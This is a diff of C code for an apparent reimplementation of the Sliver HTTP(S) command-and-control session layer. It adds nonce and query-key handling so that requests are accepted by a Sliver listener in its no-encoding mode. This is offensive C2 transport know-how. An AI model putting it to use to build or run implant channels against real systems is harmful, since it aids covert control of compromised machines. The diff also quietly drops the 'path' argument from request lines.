@@ -1,4 +1,4 @@
-/* src/transport/http_session.c - Sliver HTTP(S) C2 session layer (H3).
+﻿/* src/transport/http_session.c - Sliver HTTP(S) C2 session layer (H3).
  *
  * The real listener does not accept bare envelopes: it authenticates a session
  * cookie, decodes the body with a nonce-selected encoder and decrypts it with the
@@ -48,6 +48,32 @@ int sliver_http_session_init(sliver_http_session_t *s, const char *host, uint16_
 }
 
 /* --- minimal HTTP exchange ---------------------------------------------- */
+/* The listener derives the encoder from a nonce carried in the URL
+ * (server/c2/http.go getNoncesFromURL: query values or path segments that parse
+ * as uint64). Without one it answers 404 with ErrMissingNonce. We always emit a
+ * nonce that is a multiple of 65537 so EncoderFromNonce selects id 0
+ * (NoEncoder), and use a one-character query key because the authenticated
+ * lookup matches keys whose length equals ImplantConfig.NonceQueryLength (1 in
+ * the default profile). */
+static void session_target(sliver_http_session_t *s, char *out, size_t cap) {
+  sliver_http_c2_t prof;
+  const char *chars = "abcdefghijklmnopqrstuvwxyz";
+  char key = 'a';
+  unsigned long long nonce = 0;
+  memset(&prof, 0, sizeof(prof));
+  if (sliver_config_http_c2(&prof) == 1 && prof.nonce_query_arg_chars != NULL &&
+      prof.nonce_query_arg_chars[0] != '\0') {
+    chars = prof.nonce_query_arg_chars;
+  }
+  if (sliver_encoder_pick_nonce(SLIVER_ENCODER_NOP, &nonce) == 0 && nonce != 0) {
+    key = chars[nonce % strlen(chars)];
+  }
+  if (nonce == 0) {
+    nonce = 65537ull;
+  }
+  (void)snprintf(out, cap, "%s%c%c=%llu", s->base_path,
+                 strchr(s->base_path, '?') != NULL ? '&' : '?', key, nonce);
+}
 int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
                                  const char *path, const void *body, size_t body_len,
                                  int *status_out, unsigned char **resp_body,
@@ -55,6 +81,7 @@ int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
   sliver_socket_t *sock = NULL;
   sliver_tls_t *tls = NULL;
   char head[1024];
+  char target[768];
   char errbuf[256];
   int head_len;
   size_t sent = 0;
@@ -71,6 +98,8 @@ int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
   if (resp_len != NULL) {
     *resp_len = 0;
   }
+
+  session_target(s, target, sizeof(target));
 
   if (s->use_tls) {
     errbuf[0] = '\0';
@@ -96,7 +125,7 @@ int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
                       "Connection: close\r\n"
                       "%s%s%s"
                       "\r\n",
-                      method, path[0] != '\0' ? path : "/", s->host, (unsigned)s->port,
+                      method, target, s->host, (unsigned)s->port,
                       (unsigned)body_len, s->have_cookie ? "Cookie: " : "",
                       s->have_cookie ? s->cookie_name : "", s->have_cookie ? "" : "");
   if (head_len <= 0 || (size_t)head_len >= sizeof(head)) {
@@ -112,7 +141,7 @@ int sliver_http_session_exchange(sliver_http_session_t *s, const char *method,
                         "Connection: close\r\n"
                         "Cookie: %s=%s\r\n"
                         "\r\n",
-                        method, path[0] != '\0' ? path : "/", s->host, (unsigned)s->port,
+                        method, target, s->host, (unsigned)s->port,
                         (unsigned)body_len, s->cookie_name, s->cookie_value);
     if (head_len <= 0 || (size_t)head_len >= sizeof(head)) {
       goto fail;
